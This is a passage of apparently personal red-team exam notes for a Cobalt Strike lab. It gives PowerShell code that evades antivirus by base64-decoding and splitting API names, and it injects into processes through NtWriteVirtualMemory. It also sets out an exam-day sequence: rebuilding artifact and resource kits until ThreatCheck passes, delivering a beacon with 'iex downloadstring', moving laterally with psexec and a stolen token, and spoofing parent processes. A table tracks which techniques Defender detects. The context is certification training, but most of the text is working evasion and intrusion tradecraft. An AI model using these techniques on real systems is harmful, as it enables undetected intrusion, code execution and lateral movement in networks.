# Base64 decode at runtime (strongest):
.Equals([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLmRsbA==')))
# 'U3lzdGVtLmRsbA==' = base64('System.dll')
```

### Resource Kit — `WriteProcessMemory` Alternative Bypasses

If the API name string is flagged:

```powershell
# Split the API name string:
func_get_proc_address kernel32.dll ('Write'+'ProcessMemory')

# Lower-level ntdll API — less signatured:
$var_ntwvm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (func_get_proc_address ntdll.dll ('NtWrite'+'VirtualMemory')),
    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([UInt32]))
)
$var_ntwvm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [ref]0) | Out-Null
```

**Priority:** Lab value → ThreatCheck → split string → ThreatCheck → NtWriteVirtualMemory if still flagged.

---

### Lab End-to-End Flow (Exam Day Order)

```
1. SSH to team server → edit /opt/cobaltstrike/profiles/default.profile
   → Add stage, post-ex, process-inject blocks (use lab-proven values above)
   → Save → docker restart cobaltstrike-cs-1 → check logs for errors

2. WSL on Windows dev box:
   → cd arsenal-kit/kits/artifact → patch patch.c (lines ~45, ~116)
   → ./build.sh mailslot VirtualAlloc 351363 0 false false none ./custom-artifacts
   → ThreatCheck on artifact64big.exe → fix if detected → rebuild

3. WSL on Windows dev box:
   → cd arsenal-kit/kits/resource → ./build.sh ./custom-resources
   → VSCode: fix template.x64.ps1 (line 5 + line 32) → replace compress.ps1
   → ThreatCheck -e AMSI on template.x64.ps1 → fix if detected

4. CS Script Manager → load artifact.cna, then resources.cna

5. Test: Scripted Web Delivery → iex downloadstring on target → beacon checkin

6. Before lateral with psexec:
   beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
   beacon> make_token DOMAIN\user <password>
   beacon> jump psexec64 <target> smb

7. Before any fork & run:
   beacon> ppid <explorer.exe PID>
   beacon> spawnto x64 %windir%\sysnative\werfault.exe
```

---

## ⚠️ Defender Observations

| Date | Technique | Result | Note |
|------|-----------|--------|------|
| 2026-04-26 | `elevate uac-token-duplication smb` | 🔴 DETECTED — beacon killed | Entire `elevate` built-in family is signatured. Never use on exam day. Use `steal_token` from SYSTEM proc or service EXE abuse instead. |
